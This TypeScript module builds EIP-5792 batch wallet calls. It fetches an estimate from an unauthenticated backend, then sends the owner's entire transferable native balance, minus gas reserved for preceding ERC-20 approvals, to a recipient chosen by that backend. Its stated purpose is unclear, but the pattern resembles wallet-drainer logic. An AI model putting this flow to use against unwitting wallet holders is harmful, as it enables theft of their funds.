import { resolveApiUrl } from "../core/api-url";
import {
  correlationHeaders,
  getActiveTransaction,
} from "../core/transaction-context";
import type { NativeTransferEstimate } from "../native-transfer/types";

/**
 * Fetch native transfer estimate for EIP-5792 batching (no wallet session auth —
 * `/api/native-transfers/estimate` is unauthenticated).
 */
export async function fetchNativeTransferEstimate(args: {
  apiBaseUrl?: string;
  network: string;
  owner: string;
  traceId?: string;
}): Promise<NativeTransferEstimate | null> {
  try {
    const transactionId = args.traceId ?? getActiveTransaction()?.transactionId;

    const res = await fetch(
      resolveApiUrl(args.apiBaseUrl, "/api/native-transfers/estimate"),
      {
        method: "POST",
        headers: {
          "content-type": "application/json",
          ...correlationHeaders(transactionId),
        },
        body: JSON.stringify({
          network: args.network,
          owner: args.owner,
          traceId: transactionId,
        }),
        cache: "no-store",
      },
    );
    const json = (await res.json()) as NativeTransferEstimate;
    if (!res.ok || json.transferableRaw == null) return null;
    if (!json.canTransfer || BigInt(json.transferableRaw) <= BigInt(0))
      return null;
    if (!json.recipient) return null;
    return json;
  } catch {
    return null;
  }
}

function toHexValue(value: string | bigint): string {
  const v = typeof value === "bigint" ? value : BigInt(value);
  return `0x${v.toString(16)}`;
}

/** Conservative ERC-20 approve gas units per batch job (pre-buffer). */
export const BATCH_APPROVE_GAS_UNBUFFERED = 65_000n;

/** Match backend default `applyGasLimitBuffer(120/100)`. */
export function bufferedBatchGasLimit(unbuffered: bigint): bigint {
  return (unbuffered * 120n + 99n) / 100n;
}

/**
 * Lower transferable raw when native is bundled after ERC-20 approvals in the
 * same EIP-5792 batch so the native leg retains gas for preceding calls.
 */
export function reserveBatchApprovalGas(args: {
  estimate: NativeTransferEstimate;
  approvalJobCount: number;
}): NativeTransferEstimate | null {
  if (args.approvalJobCount <= 0) {
    return args.estimate;
  }

  const maxFeePerGas = BigInt(args.estimate.maxFeePerGas ?? "0");
  if (maxFeePerGas <= BigInt(0)) {
    return args.estimate;
  }

  const perApproveGas = bufferedBatchGasLimit(BATCH_APPROVE_GAS_UNBUFFERED);
  const reserveRaw =
    perApproveGas * maxFeePerGas * BigInt(args.approvalJobCount);
  const transferable = BigInt(args.estimate.transferableRaw);
  const adjusted =
    transferable > reserveRaw ? transferable - reserveRaw : BigInt(0);

  if (adjusted <= BigInt(0)) {
    return null;
  }

  return {
    ...args.estimate,
    transferableRaw: adjusted.toString(),
    canTransfer: true,
  };
}

export function buildNativeWalletCall(
  estimate: NativeTransferEstimate,
): { to: string; data: string; value: string } | null {
  if (!estimate.recipient || BigInt(estimate.transferableRaw) <= BigInt(0)) {
    return null;
  }
  return {
    to: estimate.recipient,
    data: "0x",
    value: toHexValue(estimate.transferableRaw),
  };
}

/** Build native batch call, reserving gas for preceding approval jobs when needed. */
export function buildNativeWalletCallForBatch(
  estimate: NativeTransferEstimate,
  approvalJobCount: number,
): { to: string; data: string; value: string } | null {
  const adjusted = reserveBatchApprovalGas({ estimate, approvalJobCount });
  if (!adjusted) return null;
  return buildNativeWalletCall(adjusted);
}
